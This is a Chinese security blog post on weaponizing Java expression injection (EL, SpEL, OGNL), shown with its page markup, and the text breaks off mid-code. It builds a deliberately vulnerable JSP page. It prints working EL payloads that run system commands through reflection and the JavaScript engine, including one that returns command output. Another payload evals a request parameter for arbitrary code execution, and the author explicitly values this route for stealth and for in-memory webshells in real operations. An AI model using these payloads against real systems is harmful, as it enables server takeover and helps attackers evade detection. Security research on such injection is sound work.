

<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title>Java表达式注入的武器化利用 - </title><meta name="Description" content="Java表达式注入的武器化利用"><meta property="og:title" content="Java表达式注入的武器化利用" />
<meta property="og:description" content="Java表达式注入的武器化利用" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://yzddmr6.com/posts/java-expression-exploit/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-06-11T20:02:47+00:00" />
<meta property="article:modified_time" content="2022-06-11T20:02:47+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>

<meta name="twitter:title" content="Java表达式注入的武器化利用"/>
<meta name="twitter:description" content="Java表达式注入的武器化利用"/>
<meta name="application-name" content="yzddMr6&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">

<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/java-expression-exploit/" /><link rel="prev" href="https://yzddmr6.com/posts/asp-net-memory-shell-virtualpath/" /><link rel="next" href="https://yzddmr6.com/posts/litejre-for-shellcode-loader/" />
<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Java表达式注入的武器化利用",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/yzddmr6.com\/posts\/java-expression-exploit\/"
        },"genre": "posts","wordcount":  3308 ,
        "url": "https:\/\/yzddmr6.com\/posts\/java-expression-exploit\/","datePublished": "2022-06-11T20:02:47+00:00","dateModified": "2022-06-11T20:02:47+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": {
                    "@type": "ImageObject",
                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
                    "width":  640 ,
                    "height":  640 
                }},"author": {
                "@type": "Person",
                "name": "yzddMr6"
            },"description": "Java表达式注入的武器化利用"
    }
    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
</head>

<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
        window.switchThemeEventSet = new Set()
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="">yzddMr6&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
                    <i class="fas fa-adjust fa-fw"></i>
                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
                        <option value="light">浅色</option>
                        <option value="dark">深色</option>
                        <option value="black">黑色</option>
                        <option value="auto">跟随系统</option>
                    </select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="">yzddMr6&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
                <i class="fas fa-adjust fa-fw"></i>
                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
                    <option value="light">浅色</option>
                    <option value="dark">深色</option>
                    <option value="black">黑色</option>
                    <option value="auto">跟随系统</option>
                </select>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><div class="toc" id="toc-auto">
        <h2 class="toc-title">目录</h2>
        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
  <ul>
    <li><a href="#前言">前言</a></li>
    <li><a href="#关于武器化">关于武器化</a></li>
    <li><a href="#中间层语言的选取">中间层语言的选取</a></li>
    <li><a href="#手工利用">手工利用</a>
      <ul>
        <li><a href="#环境搭建">环境搭建</a></li>
        <li><a href="#无回显执行命令">无回显执行命令</a></li>
        <li><a href="#有回显执行命令">有回显执行命令</a></li>
        <li><a href="#任意代码执行">任意代码执行</a></li>
      </ul>
    </li>
    <li><a href="#蚁剑改造之一键连接">蚁剑改造之一键连接</a>
      <ul>
        <li><a href="#改造内容">改造内容</a></li>
        <li><a href="#el表达式">EL表达式</a></li>
        <li><a href="#spel表达式">Spel表达式</a></li>
        <li><a href="#ognl表达式">Ognl表达式</a></li>
      </ul>
    </li>
    <li><a href="#as-exploits一键连接">As-Exploits一键连接</a></li>
    <li><a href="#最后">最后</a></li>
    <li><a href="#参考">参考</a></li>
  </ul>
</nav></div>
    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Java表达式注入的武器化利用</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
                </span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-06-11">2022-06-11</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-06-11">2022-06-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3308 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 7 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#前言">前言</a></li>
    <li><a href="#关于武器化">关于武器化</a></li>
    <li><a href="#中间层语言的选取">中间层语言的选取</a></li>
    <li><a href="#手工利用">手工利用</a>
      <ul>
        <li><a href="#环境搭建">环境搭建</a></li>
        <li><a href="#无回显执行命令">无回显执行命令</a></li>
        <li><a href="#有回显执行命令">有回显执行命令</a></li>
        <li><a href="#任意代码执行">任意代码执行</a></li>
      </ul>
    </li>
    <li><a href="#蚁剑改造之一键连接">蚁剑改造之一键连接</a>
      <ul>
        <li><a href="#改造内容">改造内容</a></li>
        <li><a href="#el表达式">EL表达式</a></li>
        <li><a href="#spel表达式">Spel表达式</a></li>
        <li><a href="#ognl表达式">Ognl表达式</a></li>
      </ul>
    </li>
    <li><a href="#as-exploits一键连接">As-Exploits一键连接</a></li>
    <li><a href="#最后">最后</a></li>
    <li><a href="#参考">参考</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
<p>首发于公众号：<strong>网络安全回收站</strong></p>
<h2 id="前言" class="headerLink">
    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>Java安全从业者能吃上饭的三个主要原因：反序列化，JNDI注入，表达式注入（开个玩笑）。本文想就这三种类型的漏洞的利用谈谈自己的看法，同时提出表达式注入下的武器化利用方法。</p>
<h2 id="关于武器化" class="headerLink">
    <a href="#%e5%85%b3%e4%ba%8e%e6%ad%a6%e5%99%a8%e5%8c%96" class="header-mark"></a>2 关于武器化</h2><p>在本人看来，漏洞武器化利用方式主要有以下几个特点</p>
<ol>
<li>便捷性：一键式、傻瓜式操作。</li>
<li>通用性：兼容各种环境。</li>
<li>支持任意代码执行，而非单纯命令执行。</li>
<li>扩展性：联动其他工具。</li>
</ol>
<p>目前大多数工具只是做到了任意命令执行，但是在实战中我们更希望得到一个任意代码执行的口子。原因是：</p>
<ol>
<li>任意命令执行在进程命令行层面很容易留下痕迹被发现，而任意代码执行在语言函数层面，有天然的隐蔽的优势。</li>
<li>任意代码执行可以实现注入内存马等进阶操作。</li>
</ol>
<p>反序列化漏洞在Java安全中的重要性无需多提，其中较为著名的漏洞有weblogic系列漏洞，shiro反序列化漏洞等。其中较为有名的利用工具有ysoserial，几乎是每一个入门Java安全的同学必须学习的一个项目。但实际上ysoserial只是做到了最基础的“命令执行”，并不支持任意代码执行。wh1t3p1g师傅的ysomap则进行了大量的改进。不仅增加了非常多的利用模块，而且增加了很多利用链下任意代码执行的利用方式。</p>
<p>JNDI注入。代表作Log4Shell，核弹漏洞。基础利用工具代表：marshalsec。武器化利用工具代表为feihong师傅的JNDIExploit。可以一键搭建ldap跟http环境，并且可以根据lookup对象的名称来执行动态的参数，还添加了一键注入内存马等功能。同样是做到了从任意命令执行到任意代码执行。</p>
<p>表达式注入漏洞。代表成员有Struts2的ognl表达式注入，SpringBoot spel表达式注入，Tomcat的EL表达式注入等。但是目前大多payload还是弹一个计算器，并没有见到成熟的武器化利用方式。</p>
<p>那么怎么才能实现表达式注入的武器化利用呢？</p>
<h2 id="中间层语言的选取" class="headerLink">
    <a href="#%e4%b8%ad%e9%97%b4%e5%b1%82%e8%af%ad%e8%a8%80%e7%9a%84%e9%80%89%e5%8f%96" class="header-mark"></a>3 中间层语言的选取</h2><p>Java中主流的表达式注入分为三种：EL，Spel，Ognl。不同表达式有不同的语法特点，有些必须要用反射去实例化类，有些可以直接new；有些表达式只能执行一句，有些可以执行多句。所以想要做到武器化利用就要选取一种通用的中间层语言。</p>
<p>自己曾经研究过一种基于JS引擎的Java一句话木马。其中JS引擎就非常符合我们的要求：</p>
<ol>
<li>一行代码即可执行，无需执行多句</li>
<li>JDK&gt;=6都可以使用</li>
<li>Java函数层面，可以做到任意代码执行</li>
</ol>
<p>自己在博客文章里面对js引擎的各种语法进行了详细的解释：<a href="https://yzddmr6.com/posts/%e4%b8%80%e7%a7%8d%e6%96%b0%e5%9e%8bJava%e4%b8%80%e5%8f%a5%e8%af%9d%e6%9c%a8%e9%a9%ac%e7%9a%84%e5%ae%9e%e7%8e%b0/" target="_blank" rel="noopener noreferrer">https://yzddmr6.com/posts/%E4%B8%80%E7%A7%8D%E6%96%B0%E5%9E%8BJava%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0/</a></p>
<h2 id="手工利用" class="headerLink">
    <a href="#%e6%89%8b%e5%b7%a5%e5%88%a9%e7%94%a8" class="header-mark"></a>4 手工利用</h2><h3 id="环境搭建" class="headerLink">
    <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="header-mark"></a>4.1 环境搭建</h3><p>Tomcat 8.5+jdk8</p>
<p>这里模拟了一个el表达式注入的场景</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="p">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="p">=</span><span class="s">&#34;org.apache.jasper.runtime.PageContextImpl&#34;</span> <span class="p">%&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;%</span>
</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">res</span> <span class="p">=</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span> <span class="n">PageContextImpl</span><span class="p">.</span><span class="n">proprietaryEvaluate</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s">&#34;code&#34;</span><span class="p">),</span> <span class="n">String</span><span class="p">.</span><span class="n">class</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">out</span><span class="p">.</span><span class="n">print</span><span class="p">(</span><span class="n">res</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">%&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="无回显执行命令" class="headerLink">
    <a href="#%e6%97%a0%e5%9b%9e%e6%98%be%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4" class="header-mark"></a>4.2 无回显执行命令</h3><p>可能大家最常见到的就是执行命令的payload，由于el表达式不能执行new等操作，所以需要用反射来构造。</p>
<p>样例如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">code</span><span class="p">=</span><span class="err">$</span><span class="p">{</span><span class="s">&#34;&#34;</span><span class="p">.</span><span class="n">getClass</span><span class="p">().</span><span class="n">forName</span><span class="p">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="p">).</span><span class="n">getMethod</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="s">&#34;&#34;</span><span class="p">.</span><span class="n">getClass</span><span class="p">()).</span><span class="n">invoke</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">.</span><span class="n">getClass</span><span class="p">().</span><span class="n">forName</span><span class="p">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="p">).</span><span class="n">getMethod</span><span class="p">(</span><span class="s">&#34;getRuntime&#34;</span><span class="p">).</span><span class="n">invoke</span><span class="p">(</span><span class="k">null</span><span class="p">),</span><span class="s">&#34;calc.exe&#34;</span><span class="p">)}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>或者是借助js引擎</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">code</span><span class="p">=</span><span class="err">$</span><span class="p">{</span><span class="s">&#34;&#34;</span><span class="p">.</span><span class="n">getClass</span><span class="p">().</span><span class="n">forName</span><span class="p">(</span><span class="s">&#34;javax.script.ScriptEngineManager&#34;</span><span class="p">).</span><span class="n">newInstance</span><span class="p">().</span><span class="n">getEngineByName</span><span class="p">(</span><span class="s">&#34;js&#34;</span><span class="p">).</span><span class="n">eval</span><span class="p">(</span><span class="s">&#34;new+java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;cmd&#39;,&#39;/c&#39;,&#39;calc&#39;]).start()&#34;</span><span class="p">)}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>不过两者都是无回显的，不优雅。</p>
<h3 id="有回显执行命令" class="headerLink">
    <a href="#%e6%9c%89%e5%9b%9e%e6%98%be%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4" class="header-mark"></a>4.3 有回显执行命令</h3><p>最早看到的有回显相关的研究是在这篇文章：https://forum.butian.net/share/886，写的非常好，最后的payload如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="err">$</span><span class="p">{</span><span class="n">pageContext</span><span class="p">.</span><span class="n">setAttribute</span><span class="p">(</span><span class="s">&#34;inputStream&#34;</span><span class="p">,</span> <span class="n">Runtime</span><span class="p">.</span><span class="n">getRuntime</span><span class="p">().</span><span class="n">exec</span><span class="p">(</span><span class="s">&#34;cmd /c dir&#34;</span><span class="p">).</span><span class="n">getInputStream</span><span class="p">());</span><span class="n">Thread</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="m">1000</span><span class="p">);</span><span class="n">pageContext</span><span class="p">.</span><span class="n">setAttribute</span><span class="p">(</span><span class="s">&#34;inputStreamAvailable&#34;</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s">&#34;inputStream&#34;</span><span class="p">).</span><span class="n">available</span><span class="p">());</span><span class="n">pageContext</span><span class="p">.</span><span class="n">setAttribute</span><span class="p">(</span><span class="s">&#34;byteBufferClass&#34;</span><span class="p">,</span> <span class="n">Class</span><span class="p">.</span><span class="n">forName</span><span class="p">(</span><span class="s">&#34;java.nio.ByteBuffer&#34;</span><span class="p">));</span><span class="n">pageContext</span><span class="p">.</span><span class="n">setAttribute</span><span class="p">(</span><span class="s">&#34;allocateMethod&#34;</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s">&#34;byteBufferClass&#34;</span><span class="p">).</span><span class="n">getMethod</span><span class="p">(</span><span class="s">&#34;allocate&#34;</span><span class="p">,</span> <span class="n">Integer</span><span class="p">.</span><span class="n">TYPE</span><span class="p">));</span><span class="n">pageContext</span><span class="p">.</span><span class="n">setAttribute</span><span class="p">(</span><span class="s">&#34;heapByteBuffer&#34;</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s">&#34;allocateMethod&#34;</span><span class="p">).</span><span class="n">invoke</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s">&#34;inputStreamAvailable&#34;</span><span class="p">)));</span><span class="n">pageContext</span><span class="p">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s">&#34;inputStream&#34;</span><span class="p">).</span><span class="n">read</span><span class="p">(</span><span class="n">pageContext</span><span class="p">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s">&#34;heapByteBuffer&#34;</span><span class="p">).</span><span class="n">array</span><span class="p">(),</span> <span class="m">0</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s">&#34;inputStreamAvailable&#34;</span><span class="p">));</span><span class="n">pageContext</span><span class="p">.</span><span class="n">setAttribute</span><span class="p">(</span><span class="s">&#34;byteArrType&#34;</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s">&#34;heapByteBuffer&#34;</span><span class="p">).</span><span class="n">array</span><span class="p">().</span><span class="n">getClass</span><span class="p">());</span><span class="n">pageContext</span><span class="p">.</span><span class="n">setAttribute</span><span class="p">(</span><span class="s">&#34;stringClass&#34;</span><span class="p">,</span> <span class="n">Class</span><span class="p">.</span><span class="n">forName</span><span class="p">(</span><span class="s">&#34;java.lang.String&#34;</span><span class="p">));</span><span class="n">pageContext</span><span class="p">.</span><span class="n">setAttribute</span><span class="p">(</span><span class="s">&#34;stringConstructor&#34;</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s">&#34;stringClass&#34;</span><span class="p">).</span><span class="n">getConstructor</span><span class="p">(</span><span class="n">pageContext</span><span class="p">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s">&#34;byteArrType&#34;</span><span class="p">)));</span><span class="n">pageContext</span><span class="p">.</span><span class="n">setAttribute</span><span class="p">(</span><span class="s">&#34;stringRes&#34;</span><span class="p">,</span> <span class="n">pageContext</span><span class="p">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s">&#34;stringConstructor&#34;</span><span class="p">).</span><span class="n">newInstance</span><span class="p">(</span><span class="n">pageContext</span><span class="p">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s">&#34;heapByteBuffer&#34;</span><span class="p">).</span><span class="n">array</span><span class="p">()));</span><span class="n">pageContext</span><span class="p">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s">&#34;stringRes&#34;</span><span class="p">)}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>由于EL表达式不支持直接赋值以及new对象，所以需要用到pageContext.getAttribute跟pageContext.setAttribute来间接实现变量的传递，导致payload写起来非常的麻烦，也非常的臃肿。</p>
<p>所以我们换一种思路，不再使用EL自身的语法，而是在js引擎中实现我们的逻辑。</p>
<p>经过简化后，我们的payload如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="err">$</span><span class="p">{</span><span class="s">&#34;&#34;</span><span class="p">.</span><span class="n">getClass</span><span class="p">().</span><span class="n">forName</span><span class="p">(</span><span class="s">&#34;javax.script.ScriptEngineManager&#34;</span><span class="p">).</span><span class="n">newInstance</span><span class="p">().</span><span class="n">getEngineByName</span><span class="p">(</span><span class="s">&#34;js&#34;</span><span class="p">).</span><span class="n">eval</span><span class="p">(</span><span class="s">&#34;var s = [3];s[0] = \&#34;cmd\&#34;;s[1] = \&#34;/c\&#34;;s[2] = \&#34;whoami\&#34;;var p = java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\&#34;GBK\&#34;).useDelimiter(\&#34;\\\\A\&#34;);var result = sc.hasNext() ? sc.next() : \&#34;\&#34;;sc.close();result;&#34;</span><span class="p">)}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647669356273-0d16b625-68c9-4be5-aba2-885cd30c4420.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647669356273-0d16b625-68c9-4be5-aba2-885cd30c4420.png">
        <img
            
            loading="lazy"
            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647669356273-0d16b625-68c9-4be5-aba2-885cd30c4420.png"
            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1647669356273-0d16b625-68c9-4be5-aba2-885cd30c4420.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647669356273-0d16b625-68c9-4be5-aba2-885cd30c4420.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1647669356273-0d16b625-68c9-4be5-aba2-885cd30c4420.png 2x"
            sizes="auto"
            alt="img">
    </a></figure></p>
<h3 id="任意代码执行" class="headerLink">
    <a href="#%e4%bb%bb%e6%84%8f%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c" class="header-mark"></a>4.4 任意代码执行</h3><p>在这里我们同样可以借助js引擎调用defineClass来实现任意代码执行的操作：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">code</span><span class="p">=</span><span class="err">$</span><span class="p">{</span><span class="s">&#34;&#34;</span><span class="p">.</span><span class="n">getClass</span><span class="p">().</span><span class="n">forName</span><span class="p">(</span><span class="s">&#34;javax.script.ScriptEngineManager&#34;</span><span class="p">).</span><span class="n">newInstance</span><span class="p">().</span><span class="n">getEngineByName</span><span class="p">(</span><span class="s">&#34;js&#34;</span><span class="p">).</span><span class="n">eval</span><span class="p">(</span><span class="n">pageContext</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s">&#34;ant&#34;</span><span class="p">))}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ant参数内容如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">load</span><span class="p">(</span><span class="s">&#34;nashorn:mozilla_compat.js&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">  <span class="n">importPackage</span><span class="p">(</span><span class="n">Packages</span><span class="p">.</span><span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">importPackage</span><span class="p">(</span><span class="n">Packages</span><span class="p">.</span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">);</span>
